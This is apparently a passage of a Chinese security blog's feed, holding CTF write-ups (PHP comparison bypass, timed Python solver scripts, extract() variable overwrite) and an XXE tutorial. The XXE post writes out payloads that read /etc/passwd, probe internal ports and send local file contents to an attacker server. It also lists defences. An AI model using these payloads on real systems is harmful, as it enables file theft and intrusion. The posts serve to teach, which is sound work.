class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/24/dA8cKwnp1bBkTPS.png" alt="QQ截图20191124110502.png"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>题目较简单</p><p>考察PHP的特性</p><p>抓包 看到cookie <code>user=0</code> 替换成 <code>user=1</code></p><p>绕过第一层</p><p>接下来看到源码里有一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要<code>post</code>一个<code>password</code>参数参数 是数字型还必须等于404 看似矛盾</p><p>利用<code>==</code>特性<code>password=404a</code>即可绕过</p><p>最后还需要传入<code>monkey</code>参数 值必须大于<code>100000000</code></p><p>直接</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">404</span>aaa&amp;<span class="section">money</span>=<span class="number">100000000</span></span><br></pre></td></tr></table></figure><p>会提示值的长度太长 这里科学计数法绕过</p><p>最终payload为</p><p><img src="https://i.loli.net/2019/11/28/6IvTOAgdly8hJbq.png" alt="QQ图片20191128210724.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XXE漏洞利用</title>
      <link href="/2019/09/08/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/08/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h2><p>XXE就是XML外部实体注入</p><p>XXE漏洞发生在应用程序解析XML输入时 如果网站没有禁止外部实体加载，则导致可加载恶意外部文件，任意文件读取 命令执行 探测内网端口等等</p><h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>在我们利用XML实体注入时 一般payload会写在DTD里</p><p>DTD 可内部声明和外部声明</p><p>这篇文章的内容是XXE(外部实体注入) 所以重点说一下外部</p><h2 id="恶意引入外部实体方式"><a href="#恶意引入外部实体方式" class="headerlink" title="恶意引入外部实体方式"></a>恶意引入外部实体方式</h2><h3 id="检测是否存在XXE"><a href="#检测是否存在XXE" class="headerlink" title="检测是否存在XXE"></a>检测是否存在XXE</h3><p><strong>xml是否被解析</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span> <span class="meta">&lt;!DOCTYPE ANY [ &lt;!ENTITY test “test”&gt; ]&gt;</span> <span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>返回test，进行第二步</p><p><strong>检测是否支持外部实体</strong></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE ANYTHING [</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">test</span> <span class="attr">SYSTEM</span> “<span class="attr">http:</span>//<span class="attr">test</span>/<span class="attr">test.xml</span>”&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%test;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure><p>目标服务器是否向我们所设置服务器<code>http://test/test.xml</code>发送请求，如果以上两点都存在的情况下，说明存在XXE漏洞 存在也分为两种情况 回显和无回显</p><h3 id="服务器存在回显"><a href="#服务器存在回显" class="headerlink" title="服务器存在回显"></a>服务器存在回显</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE linux [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过URI将请求指向了/etc/passwd文件，并最终成功的为我们返回了文件中的内容</p><p>有回显的话 会输出<code>/etc/passwd</code>下的内容。</p><p>如果服务器没有回显可以<code>blind xxe</code></p><h3 id="服务器不存在回显"><a href="#服务器不存在回显" class="headerlink" title="服务器不存在回显"></a><strong>服务器不存在回显</strong></h3><p>不存在回显的情况下我们 可以远程读取文件 被称作 <code>blind xxe</code>漏洞</p><p>远程情况下我们需要一个服务器</p><p>漏洞网站提交</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE ANY[</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">1.txt</span>"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">192.168.2.1</span>/<span class="attr">evil.xml</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%remote;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">%all;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>本地服务器<code>evil.xml</code>内容为</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> % <span class="keyword">all</span> <span class="string">"&lt;!ENTITY send SYSTEM 'http://192.168.2.1/1.php?file=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>查看自己服务器访问日志 即可拿到数据</p><h2 id="利用场景-检测内网端口"><a href="#利用场景-检测内网端口" class="headerlink" title="利用场景-检测内网端口"></a>利用场景-检测内网端口</h2><p>以下代码将尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE XXE [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY XXE SYSTEM "http://127.0.0.1:8080" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;XXE;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory <span class="attr">dbf</span> =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml <span class="built_in">import</span> etree</span><br><span class="line"><span class="attr">xmlData</span> = etree.parse(xmlSource,etree.XMLParser(<span class="attr">resolve_entities=False))</span></span><br></pre></td></tr></table></figure><h2 id="CTF案例"><a href="#CTF案例" class="headerlink" title="CTF案例"></a>CTF案例</h2><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a>平台上的一题 平台题目质量很高 没事的时候刷一刷还是很有趣的。</p><p>题目提示:请设法获得目标机器<code>/home/ctf/flag.txt</code>中的flag值。</p><p><img src="https://i.loli.net/2019/09/08/vabINWfqmXjgt35.png" alt="QQ截图20190908172103.png"></p><p>抓包发现</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/json</span><br></pre></td></tr></table></figure><p>我们修改成</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/xml</span><br></pre></td></tr></table></figure><p>经检测存在XXE</p><p>XXE<code>payload</code>为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE linux [&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/08/Li9uAx6oJHkgYOy.png" alt="QQ截图20190908173755.png"></p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf中的Python脚本</title>
      <link href="/2019/05/21/ctf%E4%B8%AD%E7%9A%84Python%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/05/21/ctf%E4%B8%AD%E7%9A%84Python%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/05/24/5ce7a73fc4fe918942.jpeg" alt="下载.jpeg"></p><a id="more"></a><p>CTF中很多需要Python脚本来解决的题目 以前这类题目看到以后就会放弃。</p><p>越来越感觉无力,打不动ctf 代码基础不行 而ctf对代码的要求越来越高</p><p>暑假准备闭关好好学习一下了</p><p>今天抽时间总结一下 ,也顺便巩固了一下Python。</p><p>代码写的炒鸡烂 大佬勿喷呀！！！</p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>bugku ctf的一道题目</p><p><a href="http://123.206.87.240:8002/web6/" target="_blank" rel="noopener">http://123.206.87.240:8002/web6/</a></p><p><img src="https://i.loli.net/2019/05/22/5ce49f92d13f315667.png" alt="VSgC0f.png"></p><p>查看源代码发现 需要post一个margin参数</p><p>抓包查看响应头发现flag字段</p><p><a href="https://imgchr.com/i/VSgM7T" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/22/5ce49fac4443913573.png" alt="VSgM7T.png"></a></p><p>是一段base64加密的值 手工解密后发现还需要在解码一次 出现明文</p><p>flag的在短时间内会不断变化,我们需要两次解密flag字段 在flag密文没变的情况下把明文post提交方可得到flag。</p><p>这尼玛要不用Python 就算是单身一百年也没有用吧。</p><p>贴上脚本</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">req = requests.session()</span><br><span class="line">headers = req.get(url).headers</span><br><span class="line">key = str(base64.b64decode(headers['flag'])).split(<span class="string">":"</span>)[1]</span><br><span class="line">flag = base64.b64decode(key)</span><br><span class="line">print(flag)</span><br><span class="line">data = &#123;<span class="string">"margin"</span>:flag&#125;</span><br><span class="line">gg = req.post(url,data=data)</span><br><span class="line">print(gg.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/22/5ce4a5c14bfa228126.jpg" alt="Xnip2019-05-22_09-28-21.jpg"></p><h2 id="web-13"><a href="#web-13" class="headerlink" title="web 13"></a>web 13</h2><p>ctf论剑场里面的一题 和上题类似 </p><p><img src="https://i.loli.net/2019/05/22/5ce4a68af2be432259.jpg" alt="Xnip2019-05-22_09-31-46.jpg"></p><p>解密<code>Password</code> 之后 <code>POST</code>提交</p><p>还是用Python来写一下</p><p><img src="https://i.loli.net/2019/05/22/5ce4efd6a16a778943.jpg" alt="5A8F03593196130D846D66ED4B05904F.jpg"></p><p>代码都差不多就不贴出来咯 动手打一下印象会更深的吧</p><h2 id="web-2"><a href="#web-2" class="headerlink" title="web 2"></a>web 2</h2><p>也是ctf论剑场的一题 上星期做了一下这里的web题把需要用Python脚本解的题目都留在今天进行总结。</p><p><img src="https://i.loli.net/2019/05/23/5ce603e81513712042.png" alt="image-20190523102203183.png"></p><p>公式在不停的变化 需要在没有变化之前快速计算出结果并提交</p><p>靠手速的话是不可能的</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://123.206.31.85:10002/index.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">req = s.<span class="built_in">get</span>(url)</span><br><span class="line"><span class="built_in">key</span> = <span class="built_in">str</span>(re.findall(r<span class="string">'&lt;br/&gt;\s.*?&lt;/p&gt;'</span>,req.<span class="built_in">text</span>))</span><br><span class="line"><span class="built_in">key</span> =  eval(<span class="built_in">key</span>[<span class="number">9</span>:<span class="number">-6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">key</span>)</span><br><span class="line">data = &#123;<span class="string">"result"</span>:<span class="built_in">key</span>&#125;</span><br><span class="line">flag = s.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(flag.<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure><p>运行脚本拿到flag</p><p>我怎么感觉这题代码写的好烂呢？</p><h2 id="web-20"><a href="#web-20" class="headerlink" title="web 20"></a>web 20</h2><p><img src="https://i.loli.net/2019/05/23/5ce60a32f269440874.jpg" alt="Xnip2019-05-23_10-49-09.jpg"></p><p>动态密文。需要在变化之前 把密文通过get传给key</p><p>经过测试发现解题脚本是有几率爆出flag的所以我们需要多次尝试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'http://123.206.31.85:10020/index.php'</span></span><br><span class="line">    req = requests.session()</span><br><span class="line">    res = req.get(url).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(res)</span><br><span class="line">    encode = re.findall(<span class="string">r'(\w&#123;33&#125;)'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    print(encode)</span><br><span class="line">    params = &#123;<span class="string">'key'</span>:encode&#125;</span><br><span class="line">    flag = req.get(url=url,params=params)</span><br><span class="line">    print(flag.content.decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p>来自实验吧的题目与上面第一题非常相似又比第一题简单</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">flag = <span class="built_in">str</span>(base64.b64decode(requests.<span class="built_in">get</span>(url).headers[<span class="string">'flag'</span>])).<span class="built_in">split</span>(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">flag = flag[:<span class="number">-1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">data = &#123;<span class="string">'key'</span>:flag&#125;</span><br><span class="line"><span class="built_in">key</span> = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">key</span>.content)</span><br></pre></td></tr></table></figure><p>第一题写了注释所以这里就不写了 都是一个道理呀！！</p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>题目要求两秒钟之内计算出表达式的值</p><p><img src="https://i.loli.net/2019/05/24/5ce792ee15e3c42638.jpg" alt="Xnip2019-05-24_14-44-25.jpg"></p><p>计算出来后通过通过post提交给value参数后可拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/index.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">req = s.get(url).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">value = re.search(<span class="string">r'(&lt;div&gt;)(.*)(=)'</span>,req)</span><br><span class="line">result = eval(value.group(<span class="number">2</span>))</span><br><span class="line">print(result)</span><br><span class="line">data = &#123;<span class="string">'value'</span>:result&#125;</span><br><span class="line">flag = s.post(url=url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>正则我写的。。。简直不忍直视 换上一个比较正常的正则</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>,req)</span><br></pre></td></tr></table></figure><p>不了解正则的可以看一下</p><p><a href="https://scholar10.github.io/2019/05/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" target="_blank" rel="noopener">Python正则表达式</a></p><h2 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h2><p>题目链接<a href="http://119.23.73.3:5001/web10/" target="_blank" rel="noopener">火眼金睛</a></p><p><img src="https://i.loli.net/2019/09/18/c6yXxiq9UGIrzBA.png" alt="QQ截图20190918085120.png"></p><p>文本演示框两秒一更新 需要Python脚本来获取moctf个数后自动提交</p><p><img src="https://i.loli.net/2019/09/18/FhQMgr2nT91YNa8.png" alt="QQ截图20190918085336.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面一些都是我自己经常遇到的一些问题 特意来总结一下 另外说一句 搞安全的代码基础一定要过关。老是吃亏在代码功底上面。本人文笔 水平有限 脚本写的确实lj  (没错我自己也发现了 手动滑稽) 大佬勿喷 </p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php代码审计</title>
      <link href="/2019/05/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2019/05/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      <content type="html"><![CDATA[<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p><code>extract()</code><br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXTR_SKIP </span>- 如果有冲突，不覆盖已有的变量。</span><br></pre></td></tr></table></figure><p>具体可以参考w3c<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>这里拿项目里的关于变量覆盖的题来看一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag=<span class="string">'xxx'</span>; </span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span></span><br><span class="line"><span class="php"> &#123; </span></span><br><span class="line"><span class="php">    $content=trim(file_get_contents($flag));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($shiyan==$content)</span></span><br><span class="line"><span class="php">    &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">   <span class="keyword">else</span></span></span><br><span class="line"><span class="php">   &#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span></span><br><span class="line"><span class="php">   &#125; </span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/php_bugs/</span><span class="number">01</span> extract变量覆盖.php?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure><p>URL 通过 get 的方式传参，传输的数据以数组的形式被封装在\$_GET 中；extract()函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值；isset()函数判断是否存在变量<code>$shiyan</code>;trim()函数移除字符串两侧的空白字符或其他预定义字符 ，这里是移除字符串两侧的空格；<strong>file_get_contents()函数将整个文件读入一个字符串；</strong>假如<code>$shiyan</code>的值等于文件的内容(<code>$content</code>)时，就打印出flag</p><p>南邮ctf平台也有一道关于变量覆盖的题</p><p><a href="https://imgchr.com/i/EDKyjK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/06/EDKyjK.png" alt="EDKyjK.png"></a></p><p>与上题不同的是这题以post方式提交</p><p><a href="https://imgchr.com/i/EDKqHg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/06/EDKqHg.png" alt="EDKqHg.png"></a></p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python正则表达式</title>
      <link href="/2019/05/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/05/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<p><a href="https://imgchr.com/i/Ed55yq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/Ed55yq.png" alt="Ed55yq.png"></a></p><p>如何把一个字符串的特征或规则告诉给计算机，让计算机知道你要描述的东西。被称为正则。</p><a id="more"></a><h2 id="了解正则表达式"><a href="#了解正则表达式" class="headerlink" title="了解正则表达式"></a>了解正则表达式</h2><p>正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>如何把一个字符串的特征或规则告诉给计算机，让计算机知道你要描述的东西。被称为正则。</p><h2 id="re模块操作"><a href="#re模块操作" class="headerlink" title="re模块操作"></a>re模块操作</h2><p>Python当中提供正则表达式的基本模块</p><p>模块当中提供了一些关于正则的方法</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、re.<span class="keyword">match</span>(正则表达式,要匹配的字符串)</span><br></pre></td></tr></table></figure><p>若字符串匹配正则表达式则match方法返回匹配对象，否则返回None</p><p>也可以在<code>Match</code>对象上用<code>group()</code>方法提取出子串来 如下</p><p><a href="https://imgchr.com/i/EaxNyF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EaxNyF.md.jpg" alt="EaxNyF.md.jpg"></a></p><h2 id="正则表达式的匹配规则"><a href="#正则表达式的匹配规则" class="headerlink" title="正则表达式的匹配规则"></a>正则表达式的匹配规则</h2><h3 id="表示字符"><a href="#表示字符" class="headerlink" title="表示字符"></a>表示字符</h3><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>.</td><td>匹配任意1个字符（除了\n）</td></tr><tr><td>[ ]</td><td>匹配[ ]中列举的字符</td></tr><tr><td>\d</td><td>匹配数字，即0-9</td></tr><tr><td>\D</td><td>匹配非数字，即不是数字</td></tr><tr><td>\s</td><td>匹配空白，即 空格，tab键</td></tr><tr><td>\S</td><td>匹配非空白</td></tr><tr><td>\w</td><td>匹配单词字符，即a-z、A-Z、0-9、_</td></tr><tr><td>\W</td><td>匹配非单词字符</td></tr></tbody></table><h3 id="表示数量"><a href="#表示数量" class="headerlink" 